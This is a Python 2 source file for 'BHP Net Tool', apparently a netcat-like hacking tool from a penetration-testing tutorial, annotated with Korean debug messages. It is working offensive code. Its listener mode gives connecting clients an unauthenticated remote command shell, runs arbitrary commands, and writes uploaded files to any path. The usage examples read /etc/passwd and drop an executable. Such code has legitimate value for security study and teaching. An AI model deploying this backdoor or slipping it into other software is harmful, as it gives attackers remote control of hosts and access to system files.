#!/usr/bin/python
# -*- coding: UTF-8 -*-
import sys
import socket
import getopt
import threading
import subprocess
import traceback

#define some global variables
listen             = False
command            = False
upload             = False
execute            = ""
target             = ""
upload_destination = ""
port               = 0


# 클라이언트 모드 프로그램
def client_mode(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        print "타겟 호스트에 접속합니다..."
        client.connect((target, port))
        print "표준입력으로 입력받은 값이 있는지 확인합니다..."
        if len(buffer):
            client.send(buffer)
            
        while True:
            recv_len = 1
            response = ""
            
            while recv_len:
                print "서버로부터의 응답을 수신합니다..."
                data = client.recv(4096)
                print "응답 데이터의 크기를 검사합니다..."
                recv_len = len(data)
                response = response + data
                if recv_len < 4096:
                    break
                
            print "응답 값:"    
            print response,
            buffer = raw_input("")
            buffer += "\n"
            
            # send it off
            client.send(buffer)
            
    except :
        print "[*] Exception! Exiting."
        traceback.print_exc()
        # tear down the connection
        client.close()


# 입력받은 명령을 실행하는 프로그램
def run_command(command):
    
    # trime the newline
    command = command.rstrip()
    
    # run the command and get the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except: 
        output = "Failed to execute command.\r\n"
        
    # send the output back to the client
    return output



# 서버 모드 프로그램에서 호출되어 클라이언트 스레드를 생성하는 프로그램
def client_handler(client_socket):

    global upload
    global execute
    global command
    
    # **********************************************************
    print "STEP 1. 업로드 경로의 존재여부를 체크합니다...."
    print len(upload_destination)
    
    if len(upload_destination):
        # read in all of the bytes and write to our destination
        file_buffer = ""
        
        # keep reading data until none is available
        while True:
            data = client_socket.recv(1024)
            
            if not data:
                print "data doesn't exist so break."
                break
            
            else:
                print "data exist."
                file_buffer += data
        
        # now we take these bytes and try to write them out
        try:
            print "try file open..."
            file_descriptor = open(upload_destination, "wb")
            print "try write to file..."
            file_descriptor.write(file_buffer)
            print "try close file.."
            file_descriptor.close()
            
            # acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
            
        
    # **********************************************************        
    print "STEP 2. 실행 명령어의 존재여부를 체크합니다...."
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)
        

    # **********************************************************        
    print "STEP 3. 커맨드 쉘 요청여부를 체크합니다..."
    if command:
        while True:
            print "프롬프트를 생성합니다..."
            client_socket.send("<BHP:#> ")
            
            #now we receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
                
            print "명령어를 실행합니다..."            
            response = run_command(cmd_buffer)
            
            print "명령어 실행결과를 client에게 전송합니다..."
            client_socket.send(response)



# 서버 모드 프로그램
def server_mode():
    global target
    
    # if no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"
        
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    
    while True:
        client_socket, addr = server.accept()
        # spin off a thread to handle our new client
        print "클라이언트 스레드를 생성합니다..."
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()



def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen               - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run  - execute the given file upon receiving a connection"
    print "-c --command              - initialize a command shell"
    print "-u --upload=destination   - upon receiving connection upload a file and write to [destination]"
    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)
    

# 사용자 입력을 받아 서버 모드 혹은 클라이언트 모드로 동작한다.
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
        
    # read the commandline options
    try:
        print "사용자 입력 값을 읽습니다..."
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
        
        
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"
            
    
    # are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:
        print "클라이언트 모드로 시작됩니다..."
        
        # read in the buffer from the commandline
        # this will block, so send CTRL-D if not sending input
        # to stdin
        print "추가 입력을 기다립니다.."
        buffer = sys.stdin.read()
        # send data off
        client_mode(buffer)
        
    # we are going to listen and potentially
    # upload things, execute commands, and drop a shell back 
    # depending on our command line options above
    if listen:
        print "서버 모드로 시작됩니다...."
        server_mode()



if __name__ == '__main__':
    main()
